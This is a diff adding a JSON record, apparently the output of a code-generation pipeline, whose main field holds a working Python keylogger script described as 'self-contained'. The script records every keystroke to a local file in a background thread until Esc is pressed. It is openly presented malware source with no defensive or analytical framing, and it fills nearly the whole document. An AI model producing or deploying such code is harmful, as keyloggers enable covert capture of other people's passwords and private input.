@@ -1,0 +1,6 @@
+{
+  "output": "import keyboard\nimport threading\n\nKEYLOG_FILE = 'keylogs.txt'\n\ndef key_logger():\n    while True:\n        event = keyboard.read_event()\n        if event.name == 'esc':\n            with open(KEYLOG_FILE, 'a') as file:\n                file.write('\\n[TERMINATED]')\n            break\n        key = f'[{event.name}]' if event.event_type == 'down' and hasattr(event, 'is_keypad') else str(event.name)\n        with open(KEYLOG_FILE, 'a') as file:\n            file.write(key)\n\ndef main():\n    print('Keylogger started...')\n    logger = threading.Thread(target=key_logger, daemon=True)\n    logger.start()\n    input('Press Enter to stop logging')\n    print('Keylogger stopped.')\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Self-contained keylogger script in Python.",
+  "applied_fixes": [],
+  "iterations": 1
+}
